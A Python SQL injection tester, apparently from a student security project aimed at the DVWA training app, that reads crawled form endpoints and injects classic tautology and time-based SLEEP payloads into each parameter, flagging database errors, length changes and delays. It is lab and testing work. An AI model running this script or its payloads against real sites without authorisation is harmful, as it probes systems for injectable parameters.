#!/usr/bin/env python3
"""
sql_tester_from_scan.py

Robust SQL tester that loads scan results (CSV or JSON) auto-detecting common filenames.

Usage:
    python sql_tester_from_scan.py
    python sql_tester_from_scan.py <scan_file>

Produces OUTPUT_CSV with test results (week3_sql_results.csv inside BASE_DIR by default).
"""

import os
import sys
import csv
import json
import time
import re
import requests
from urllib.parse import urljoin
from collections import defaultdict

# CONFIG - update base if needed
BASE_DIR = "DVWA"    # change to "" if scan files are in repo root
CANDIDATES = [
    os.path.join(BASE_DIR, "scan_results_requests.csv"),
    os.path.join(BASE_DIR, "scan_results_requests.json"),
    os.path.join(BASE_DIR, "scan_results_selenium.json"),
    os.path.join(BASE_DIR, "scan_results.json"),
    "scan_results_requests.csv",
    "scan_results_requests.json",
    "scan_results_selenium.json",
    "scan_results.json",
]
OUTPUT_CSV = os.path.join(BASE_DIR, "week3_sql_results.csv")
HEADERS = {"User-Agent": "WebScanPro/1.0"}
TIME_THRESHOLD = 4.0  # seconds to flag time-based injection

# SQL payloads (basic set)
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1--",
    "\" OR \"\" = \"",
    "' OR SLEEP(5) --",
    "1' OR '1'='1"
]

# SQL error patterns (common)
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"MySQL server version",
    r"ORA-\d{5}",
    r"syntax error at or near",
    r"unclosed quotation mark",
    r"Warning: mysql_",
    r"SQLException",
    r"You have an error in your SQL syntax",
    r"MySQL server has gone away",
]
sql_error_re = re.compile("|".join(SQL_ERROR_PATTERNS), re.IGNORECASE)


def has_sql_error(text):
    return bool(text and sql_error_re.search(text))


def find_scan_file(cli_arg=None):
    if cli_arg:
        if os.path.exists(cli_arg):
            return cli_arg
        # allow relative path in BASE_DIR
        candidate = os.path.join(BASE_DIR, cli_arg)
        if os.path.exists(candidate):
            return candidate
        return None
    for fn in CANDIDATES:
        if fn and os.path.exists(fn):
            return fn
    return None


def load_scan_points_from_json(path):
    points = []
    try:
        with open(path, encoding="utf-8") as f:
            data = json.load(f)
    except Exception as e:
        print(f"[ERROR] Failed to load JSON {path}: {e}")
        return points

    # Expect data to be list of page entries, each with "page", "forms" (list)
    for entry in data:
        page = entry.get("page") or entry.get("page_url") or entry.get("url") or ""
        forms = entry.get("forms", []) or entry.get("form", [])
        if isinstance(forms, dict):
            forms = [forms]
        # If the JSON already contains flattened form entries, handle gracefully
        if not forms and isinstance(entry, dict) and "inputs" in entry:
            forms = [entry.get("inputs")]

        for form in forms:
            if not form:
                continue
            # Some scanners store forms as dicts with action/method/inputs
            if isinstance(form, dict):
                action = form.get("action") or page
                method = (form.get("method") or "get").lower()
                inputs_list = form.get("inputs", []) or form.get("fields", []) or []
                inputs = {}
                if isinstance(inputs_list, dict):
                    # already mapping
                    inputs = inputs_list
                else:
                    for inp in inputs_list:
                        if not inp:
                            continue
                        if isinstance(inp, dict):
                            name = inp.get("name")
                            value = inp.get("value") if inp.get("value") is not None else "1"
                            if name:
                                inputs.setdefault(name, value)
                        else:
                            inputs.setdefault(str(inp), "1")
                points.append({"page_url": page, "action": action, "method": method, "inputs": inputs})
            else:
                # fallback: unknown form structure
                points.append({"page_url": page, "action": page, "method": "get", "inputs": {"id": "1"}})
    return points


def load_scan_points_from_csv(path):
    """
    Support flattened CSV exported by our scanner:
    expected columns in flattened CSV: page, action, method, input_name, input_type, input_value
    The csv may contain multiple rows per form (one per input). We group them per page+action+method.
    """
    grouped = defaultdict(lambda: {"page_url": None, "action": None, "method": "get", "inputs": {}})
    try:
        with open(path, newline="", encoding="utf-8") as f:
            reader = csv.DictReader(f)
            for row in reader:
                page = row.get("page") or row.get("page_url") or row.get("pageUrl") or ""
                action = row.get("action") or row.get("endpoint") or row.get("action_url") or ""
                method = (row.get("method") or "get").lower()
                input_name = row.get("input_name") or row.get("name") or row.get("input") or ""
                input_value = row.get("input_value") or row.get("value") or row.get("default") or "1"
                key = (page or "", action or "", method)
                g = grouped[key]
                g["page_url"] = page
                g["action"] = action if action else page
                g["method"] = method
                if input_name:
                    g["inputs"].setdefault(input_name, input_value)
                else:
                    # no input_name -> maybe form row without inputs; add default param
                    g["inputs"].setdefault("id", "1")
    except Exception as e:
        print(f"[ERROR] Failed to read CSV {path}: {e}")
        return []
    # convert grouped dict to list
    points = []
    for (_, _2, _3), val in grouped.items():
        points.append(val)
    return points


def load_scan_points(scan_file):
    if not scan_file:
        return []
    if scan_file.lower().endswith(".json"):
        return load_scan_points_from_json(scan_file)
    elif scan_file.lower().endswith(".csv"):
        return load_scan_points_from_csv(scan_file)
    else:
        pts = load_scan_points_from_json(scan_file)
        if pts:
            return pts
        return load_scan_points_from_csv(scan_file)


def baseline_request(session, endpoint, params, method):
    try:
        if method == "get":
            r = session.get(endpoint, params=params, headers=HEADERS, timeout=10)
        else:
            r = session.post(endpoint, data=params, headers=HEADERS, timeout=10)
        return r.status_code, len(r.text), r.text, r.elapsed.total_seconds()
    except Exception:
        return None, None, "", 0.0


def test_point(session, endpoint, base_params, method):
    results = []
    baseline = baseline_request(session, endpoint, base_params, method)
    for payload in SQL_PAYLOADS:
        # inject payload into each parameter individually
        for param in list(base_params.keys()):
            test_params = dict(base_params)
            test_params[param] = str(test_params.get(param, "")) + payload
            try:
                if method == "get":
                    r = session.get(endpoint, params=test_params, headers=HEADERS, timeout=30)
                else:
                    r = session.post(endpoint, data=test_params, headers=HEADERS, timeout=30)
                elapsed = r.elapsed.total_seconds()
                status = r.status_code
                body = r.text
                length = len(body)
            except requests.exceptions.ReadTimeout:
                elapsed = TIME_THRESHOLD + 2
                status = None
                body = ""
                length = None
            except Exception:
                elapsed = 0
                status = None
                body = ""
                length = 0

            evidence = []
            if has_sql_error(body):
                evidence.append("sql_error_in_body")
            if baseline[1] is not None and length is not None:
                # flag content length change if large relative or absolute
                if abs((length or 0) - (baseline[1] or 0)) > max(50, 0.1 * (baseline[1] or 1)):
                    evidence.append("content_length_change")
            if elapsed and elapsed >= TIME_THRESHOLD:
                evidence.append("time_delay")

            results.append({
                "page_url": endpoint,
                "param_tested": param,
                "method": method.upper(),
                "payload": payload,
                "status": status,
                "elapsed": elapsed,
                "length": length,
                "evidence": "|".join(evidence),
                "baseline_length": baseline[1],
                "baseline_elapsed": baseline[3]
            })
    return results


def main():
    cli_arg = sys.argv[1] if len(sys.argv) > 1 else None
    scan_file = find_scan_file(cli_arg)
    if not scan_file:
        print("[ERROR] No scan results file found. Run your crawler first or pass the path as argument.")
        print("Tried:", ", ".join(CANDIDATES))
        return

    print(f"[i] Using scan results file: {scan_file}")
    points = load_scan_points(scan_file)
    if not points:
        print("[INFO] No input points found in scan results.")
        return

    session = requests.Session()
    all_results = []
    count = 0
    for p in points:
        endpoint = p.get("action") or p.get("page_url") or ""
        method = (p.get("method") or "get").lower()
        inputs = p.get("inputs") or {}
        if not inputs:
            inputs = {"id": "1"}

        # If endpoint is relative, make absolute using page_url
        if endpoint and not endpoint.startswith("http"):
            endpoint = urljoin(p.get("page_url", ""), endpoint)

        print(f"[i] Testing endpoint: {endpoint}  method={method}  params={list(inputs.keys())}")
        try:
            res = test_point(session, endpoint, inputs, method)
            all_results.extend(res)
            count += 1
        except Exception as e:
            print(f"[WARN] error testing {endpoint}: {e}")

    # write CSV
    fieldnames = ["page_url", "param_tested", "method", "payload", "status", "elapsed", "length", "evidence", "baseline_length", "baseline_elapsed"]
    out_dir = os.path.dirname(OUTPUT_CSV) or "."
    os.makedirs(out_dir, exist_ok=True)
    with open(OUTPUT_CSV, "w", newline="", encoding="utf-8") as out:
        writer = csv.DictWriter(out, fieldnames=fieldnames)
        writer.writeheader()
        for r in all_results:
            writer.writerow(r)
    print(f"[DONE] Tested {count} endpoints. results saved to {OUTPUT_CSV}")


if __name__ == "__main__":
    main()
